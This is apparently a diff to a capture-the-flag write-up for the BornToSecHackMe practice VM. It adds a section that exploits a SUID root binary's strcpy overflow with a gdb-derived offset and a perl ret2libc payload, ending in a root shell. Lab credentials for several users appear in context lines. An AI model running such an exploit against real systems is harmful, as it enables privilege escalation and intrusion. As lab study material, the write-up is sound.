@@ -236,7 +236,7 @@ Running [cmd=cat /home/LOOKATME/password](https://192.168.56.101/forum/templates
 lmezard:G!@M6f4Eatau{sF"
 ```
 
-# FTP
+# FTP - Fun
 ```shell
 ┌──(kali㉿kali)-[/tmp/b2r]
 └─$ ftp lmezard@192.168.56.101
@@ -301,7 +301,7 @@ Now SHA-256 it and submit
 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
 ```
 
-# SSH laurie
+# SSH laurie - Diffusing the bomb
 ```shell
 ┌──(kali㉿kali)-[~]
 └─$ ssh laurie@192.168.56.103
@@ -363,7 +363,7 @@ Diffusing stages of bomb are the password for thor user is `Publicspeakingisvery
 
 But according to a [stackoverflow thread](https://stackoverflow.com/c/42network/questions/664), these is an error in the ISO file, the real password is `Publicspeakingisveryeasy.126241207201b2149opekmq426135`.
 
-# SSH thor
+# SSH thor - Turle
 Two text files are located in the home directory of thor user. 
 ```shell
 ┌──(kali㉿kali)-[~]
@@ -416,4 +416,80 @@ The password is MD5 hash of SLASH.
 ```shell
 kali@kali:~$ echo -n SLASH | md5sum
 646da671ca01bb5d84dbb5fb2238dc8e  -
+```
+
+# SSH zaz - BOF/ret2libc
+A SUID executable owned by root is located in zaz's home directory.
+```shell
+kali@kali:~$ ssh zaz@192.168.56.103
+        ____                _______    _____           
+       |  _ \              |__   __|  / ____|          
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
+
+                       Good luck & Have fun
+zaz@192.168.56.103's password: 646da671ca01bb5d84dbb5fb2238dc8e
+zaz@BornToSecHackMe:~$ id
+uid=1005(zaz) gid=1005(zaz) groups=1005(zaz)
+zaz@BornToSecHackMe:~$ ls -l
+total 5
+-rwsr-s--- 1 root zaz 4880 Oct  8  2015 exploit_me
+drwxr-x--- 3 zaz  zaz  107 Oct  8  2015 mail
+```
+Reverse of `exploit_me` binary give a C program which expect on argumet, otherwise it return 1. Copy user argumet into defined `char` buffer of 128 bytes and puts it on the strandard output.
+```c
+#include <string.h>
+
+int main(int argc, char *argv[])
+{
+    char buf[128];
+
+	if (argc == 1)
+		return 1;
+	strcpy(buf, argv[1]);
+	puts(buf);
+
+	return 0;
+}
+```
+The security consideration section of `strcpy()` mention that this function is easily misused in a manner which enables malicious users to arbitrarily change a running program's functionality through a buffer overflow attack as the size of `argv[1]` is not checked.
+The goal is to overwrite the EIP register to change the direction flow of the program to call `system()` function to run a new shell, also know as [ret2libc attack](https://en.wikipedia.org/wiki/Return-to-libc_attack).</br>
+First step is to calculate an offset either by using a tool like [BOFEOSG](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) or manually.
+```gdb
+zaz@BornToSecHackMe:~$ gdb -q exploit_me
+Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
+(gdb) break *0x08048420
+Breakpoint 1 at 0x8048420
+(gdb) run 42
+Starting program: /home/zaz/exploit_me 42
+
+Breakpoint 1, 0x08048420 in main ()
+(gdb) info registers eax
+eax            0xbffff6d0	-1073744176
+(gdb) info frame
+Stack level 0, frame at 0xbffff760:
+ eip = 0x8048420 in main; saved eip 0xb7e454d3
+ Arglist at 0xbffff758, args:
+ Locals at 0xbffff758, Previous frame's sp is 0xbffff760
+ Saved registers:
+  ebp at 0xbffff758, eip at 0xbffff75c
+(gdb) print 0xbffff75c - 0xbffff6d0
+$1 = 140
+```
+The second step is to find addresse of `system()` function and the pointer to the string "/bin/sh".
+```gdb
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+(gdb) find &system,+9999999,"/bin/sh"
+0xb7f8cc58
+```
+```shell
+zaz@BornToSecHackMe:~$ ./exploit_me `perl -e 'print "A"x140 . pack("V", 0xb7e6b060) . "AAAA" . pack("V", 0xb7f8cc58)'`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`���AAAAX���
+# id
+uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
+# whoami
+root
 ```
